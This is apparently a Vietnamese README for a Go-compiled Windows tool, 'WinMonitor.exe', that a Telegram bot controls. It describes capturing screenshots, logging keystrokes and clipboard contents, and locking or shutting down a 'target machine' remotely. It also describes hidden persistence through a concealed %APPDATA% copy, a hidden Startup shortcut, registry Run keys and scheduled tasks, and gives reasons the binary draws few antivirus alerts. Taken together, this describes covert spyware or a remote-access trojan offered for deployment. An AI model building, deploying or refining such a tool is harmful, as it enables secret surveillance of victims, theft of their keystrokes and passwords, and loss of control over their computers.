# windows-native — Bản Go native `WinMonitor.exe` (KHUYẾN NGHỊ)

Đây là bản viết lại **toàn bộ tính năng bằng ngôn ngữ Go**, biên dịch thành **1 file
`WinMonitor.exe` native** — giải quyết triệt để 2 vấn đề của bản Python:

| | Bản Python (`win_monitor.pyw`) | Bản Go native (`WinMonitor.exe`) |
|---|---|---|
| Máy đích cần cài Python? | **Có** (hoặc phải đóng gói PyInstaller) | **KHÔNG** — 1 file chạy ngay |
| Kích thước | nhỏ (script) | ~6 MB (đã gồm mọi thứ) |
| Antivirus báo nhầm | Cao (PyInstaller giải nén ra temp) | **Rất thấp** (PE native, không packer, không UPX) |
| Runtime | Python | Không (static binary) |
| Tốc độ / bộ nhớ | chậm/tốn hơn | nhanh, nhẹ |

## Build

Cần cài **Go 1.21+** (https://go.dev/dl/).

```bash
# Trên Linux/macOS (cross-compile ra .exe Windows):
cd windows-native && ./build.sh

# Trên Windows:
cd windows-native && build.bat
```

Kết quả: `windows-native/WinMonitor.exe`.

> Bản `.exe` trong thư mục này được build sẵn (amd64) để tải dùng ngay.

## Tính năng (giống hệt bản Python)
- Chụp màn hình định kỳ (mặc định 5 phút) gửi Telegram — dùng GDI32, không cần thư viện ảnh.
- Giám sát cửa sổ / tiến trình / clipboard / keylogger (bật/tắt qua Telegram).
- Điều khiển: `/shutdown`, `/restart`, `/lock`, `/block` (ngắt bàn phím-chuột qua
  `BlockInput`), `/unblock`.
- **OTP** xác nhận qua Telegram cho thao tác nguy hiểm.
- Tự khởi động cùng Windows + tự phục hồi (Registry Run, 2 Scheduled Task, shortcut ẩn
  trong Startup, copy `.exe` ẩn vào `%APPDATA%\WinMonitor\`).
- Tự đẩy menu lệnh lên Telegram (`setMyCommands`).

## Cấu hình
Giống bản Python — chọn 1 trong 3 cách:
1. `WinMonitor.exe --token 123:ABC --chat 987654321`
2. Đặt `winmonitor.config.json` cạnh file `.exe` (xem `../winmonitor.config.example.json`)
3. `WinMonitor.exe --config C:\duong\dan\config.json`

## Triển khai (máy đích không cần gì cả)
1. Chép `WinMonitor.exe` sang máy đích.
2. Chạy 1 lần để cấu hình (mục trên), rồi double-click.
3. Lần đầu chạy nó tự copy vào `%APPDATA%\WinMonitor\WinMonitor.exe` (ẩn), tạo shortcut
   ẩn trong Startup + đăng ký tự khởi động/tự phục hồi.
4. Mở Telegram, nhắn `/start`.

## Vì sao ít bị antivirus báo nhầm?
- Là **PE native** thật (không phải "Python nhồi trong file tự giải nén ra %TEMP%").
- **Không dùng UPX / packer** (cờ `-ldflags "-s -w"` chỉ strip ký hiệu, không nén).
- Hành vi rõ ràng, không obfuscate. Vẫn nên **ký số** nếu muốn sạch tuyệt đối
  (xem `../tool_build/README.md` mục chống báo nhầm — áp dụng tương tự cho `.exe` Go).

## Ghi chú
- Source Go nằm ngay trong thư mục này (`main.go`, `platform_windows.go`,
  `platform_other.go`, test `main_test.go`).
- Test logic: `go test ./...`
- Cross-compile: `GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build ...`
